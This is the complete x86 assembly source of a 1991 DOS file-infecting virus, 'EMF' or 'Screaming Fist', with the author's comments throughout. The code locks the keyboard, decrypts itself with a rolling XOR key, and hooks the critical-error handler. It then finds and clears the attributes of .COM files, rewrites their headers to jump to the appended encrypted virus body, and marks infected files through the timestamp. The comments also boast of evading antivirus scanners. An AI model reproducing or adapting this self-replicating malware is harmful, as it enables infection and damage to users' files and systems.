
DATA SEGMENT
ORG 100H
DATA ENDS

; The EMF virus (c)1991 by Lazarus Long, Inc.
;  The author assumes no responsibility for any damage incurred
;  from the execution of this file, intentional or not
;


START:
         JMP VIRUS_START 
         
ENCRYPT_BYTE DB 00H             ;Storage space for byte that ID string is
                                ;Encrypted by

;------------------------------------------------------------------------------;
;The code from here to ENC_START is always unencrypted and SCAN would be able  ;
;to find it. Maybe a quick look at V2P7 would be in order (Hint,Hint!)         ;
;------------------------------------------------------------------------------;

VIRUS_START:
         CALL NEXT_STEP
NEXT_STEP:
         POP BP                            ;All actions relative to BP,

         IN AL,21H                         ;Lock out keyboard
         PUSH AX
         OR AL,2
         OUT 21H,AL


         MOV CX,ENC_LENGTH                 ;Number of bytes to decrypt                                         ;cause offsets

         LEA SI,[BP+OFFSET ENC_START-NEXT_STEP] ;Offset of data to decrypt                                          ;change in infected files
         MOV DL,[103H]                     ;Byte to decrypt with

         CALL CRYPT                        ;Decrypt main body of virus
         CALL RESTORE_EIGHT
         JMP SAVE_PSP                      ;Continue

INFECT:
         CALL CRYPT_WRITE
         MOV AH,40H
         MOV DX,BP                       ;Starting from BP-3
         SUB DX,3                        ;Which,convienently,is the start
         MOV CX,ENC_END-108H             ;of our viral code
         INT 21H                         ;Write all of virus
         CALL CRYPT_WRITE                ;Return and continue
         RET

CRYPT_WRITE:

         MOV CX,ENC_LENGTH                         ;Number of bytes to decrypt
         LEA SI,[BP+ OFFSET ENC_START - NEXT_STEP] ;Address to start decryption
         MOV DL,[0FBH]                             ;Byte to decrypt with
         CALL CRYPT
         RET

;******************************************************************************;
;Call this with SI equal to address to XOR,and CX number of bytes to XOR       :
;                                                                              ;
;******************************************************************************;
CRYPT:         
         XOR BYTE PTR [SI],DL ;XOR it
         INC SI               ;Increment XOR address
         INC DL               ;Change encryption key,eh?
         NOT DL               ;Reverse the key
         LOOP CRYPT           ;Until CX=0
         RET                  ;Then return                      

;******************************************************************************;
; Save PSP                                                                     ;
;******************************************************************************;

ENC_START EQU $
SAVE_PSP:
         MOV AH,30H                        ;Get DOS version
         INT 21H
         CMP AL,2                          ;Lower than 2?
         JNB ABOVE_2                       ;No,continue
         CALL RESTORE_EIGHT
         MOV SI,100H                       ;If so return
         PUSH SI
         RET 0FFFFH

ABOVE_2:
         PUSH ES                           ;Save ES
         MOV AX,3524H                      ;Get INT 24 address
         INT 21H
         MOV [BP+OLD_B-NEXT_STEP],BX       ;Save it
         MOV [BP+OLD_E-NEXT_STEP],ES
         MOV AH,25H                        ;Now set it to our own code
         LEA DX,[BP+NEW_24-NEXT_STEP]
         INT 21H
         POP ES                            ;Restore ES

         MOV CX,128                      ;Number of bytes to save
         MOV SI,80H                      ;From 80H.  ie the PSP
         LEA DI,[BP+ENC_END-NEXT_STEP]   ;To the end of our code
         PUSH DI                         ;Save location so we can restore the bytes
         REP MOVSB                       ;Mov'em

;------------------------------------------------------------------------------;                                                                              ;
; Find first .COM file that is either Hidden,read-only,system,or archive       ;
;------------------------------------------------------------------------------;


FIND_FIRST:

         LEA DX,[BP+WILD_CARD-NEXT_STEP]  ;Offset of *.COM,00
         MOV CX,27H                       ;Find ANY file that fits *.COM
         MOV AH,4EH                       ;Find first matching file
         INT 21H     
         JC QUIT                          ;If no *.COM files found,quit
         JMP SET_ATTRIBS

FIND_AGAIN:

         LEA DX,[BP+WILD_CARD-NEXT_STEP]   ;Offset of *.com
         MOV AH,4FH                   ;Find next matching file
         MOV CX,27H                   ;Archive,Hidden,Read-only,or System
         INT 21H
         JC QUIT                      ;No more files? Then exit

SET_ATTRIBS:
         MOV AX,[096H]          ;Get time
         AND AL,1EH             ;Are the seconds set to 60?
         CMP AL,1EH             ;
         JZ FIND_AGAIN          ;If so,assume this file is infected,find another
;------------------------------------------------------------------------------;
; Open file and infect it.                                                     ;
;                                                                              ;
;------------------------------------------------------------------------------;
         MOV DX,9EH                  ;offset into DTA of filename
         MOV AX,4301H                ;Set file attribs
         XOR CX,CX                   ;To normal file
         INT 21H
         JC QUIT                     ;Some sort of error occured,exit now!
         MOV AX,3D02H                ;Code for open file with read and write
                                     ;access
         INT 21H                     ;DX points to ASCIIZ string of filename
         MOV CX,04                   ;Read four bytes
         MOV BX,AX                   ;Save handle for future use
         MOV DX,0ACH                 ;Set buffer to end of DTA
         MOV AH,3FH                  ;Read from file
         INT 21H
         JMP MAKE_HEADER

QUIT:
         JMP DONE

;------------------------------------------------------------------------------;
; Infect .COM header so it jumps to our viral code                             ;
;------------------------------------------------------------------------------;
MAKE_HEADER:
         MOV [0F9H],[9AH]             ;Offset off file size in DTA
         MOV [0F8H]B,0E9H             ;Code for absolute JMP
         SUB WORD PTR [0F9H],2        ;Adjust it just a bit
         MOV AX,4200H                 ;Set file pointer to beginning
                                      ;of file to be infected
         XOR CX,CX                    ;Zero out CX
         XOR DX,DX                    ;Zero out DX
         INT 21H
         MOV AH,2CH                   ;Get time
         INT 21H
         ADD DL,[104H]                ;And add to what we had before
         MOV [0FBH],DL                ;Save that value for our key
         MOV AH,40H                   ;Write to file
         MOV DX,0F8H                  ;Starting at F8 hex
         MOV CX,04H                   ;Write eight bytes
         INT 21H
         
ERROR:   
         JC DONE                     ;Some sort of error?
                                     ;If so,exit
;------------------------------------------------------------------------------;
; Attach our viral code to the end of the target .COM file                     ;
;                                                                              ;
;------------------------------------------------------------------------------;
         MOV SI,0ACH                 ;Starting at A9h
         MOV CX,04                   ;Mov eight bytes
         LEA DI,[BP+ORIGINAL_EIGHT-NEXT_STEP];Where to save original eight bytes to
         REP MOVSB                   ;Save infected files original eight bytes
         MOV AX,4202H                ;Set file pointer to end of file
                                     ;plus 1
         XOR CX,CX                   ;Zero CX
         MOV DX,1                    ;Make DX=1
         INT 21H
         CALL INFECT                    ;Encrypt code, write it to file,
                                        ;Decrypt it,and return
;------------------------------------------------------------------------------;
; This restores the files original date and time                               ;
;------------------------------------------------------------------------------;

         MOV AX,5701H                   ;Restore original date and time
         MOV CX,[96H]                   ;From what was read in earlier
         MOV DX,[98H]                    
         AND CX,0FFE0H
         OR  CX,01EH                    ;Change seconds to 60
         INT 21H
         MOV AH,3EH                     ;Close that file
         INT 21H
         CALL RESTORE_ATTRIBS           ;Restore it's attributes

DONE:
RESTORE_PSP:
         PUSH DS                        ;Save the DS register
         MOV DX,[BP+OLD_B-NEXT_STEP]W   ;Move the old INT 24's address
         MOV DS,[BP+OLD_E-NEXT_STEP]W   ;so we can restore it
         MOV AX,2524H                   ;Restore it
         INT 21H
         POP DS                         ;Restore the DS register
         POP SI                         ;SI is equal to address we stored
                                        ;our PSP at
         MOV DI,80H                     ;Want to move saved PSP to 80h
         MOV CX,128                     ;Want to move 128 bytes
         REP MOVSB
         MOV SI,100H                    ;Odd sort of jump
         POP AX
         PUSH SI                        ;Ends up restoring control to
                                        ;100h
         OUT 21H,AL                     ;Unlock keyboard
         RET 0FFFFH                     ;Pop off all of stack
 
 RESTORE_EIGHT:        
         LEA SI,[BP+ORIGINAL_EIGHT-NEXT_STEP]  ;Restore original eight bytes so we
                                               ;can RET
         MOV DI,100H                           ;Destination of move
         MOV CX,04                             ;Move eight bytes
         REP MOVSB
         RET

RESTORE_ATTRIBS:
;------------------------------------------------------------------------------;
; This routine restores the files original attributes.                         ;
;------------------------------------------------------------------------------;        
         MOV AX,4301H                   ;Restore original attribs
         XOR CX,CX                      ;Zero out CX
         MOV CL,[95H]                   ;To what was read in earlier
         MOV DX,09EH                    ;Offset of filename
         INT 21H
         RET

NEW_24:
         XOR AX,AX                      ;Any error will simply be ignored
         STC                            ;Most useful for write protects
         IRET



OLD_E EQU $
OLD_ES DW 00 00
OLD_B EQU $
OLD_BX DW 00 00

ORIGINAL_EIGHT EQU $
OLD_EIGHT_BYTES  DB ,0CDH,20H,00,00      ;Bytes that are moved
                                                     ;and RET'd to
WILD_CARD EQU $
FILESPEC         DB '*.COM',00

;------------------------------------------------------------------------------
;This is just some generic text. Don't be a lamer and change the text and claim
;it was your own creation.
;------------------------------------------------------------------------------
TEXT DB 'Screaming Fist (c)10/91'
ENC_END EQU $

ENC_LENGTH = ENC_END - ENC_START              ;Length of code to be encrypted
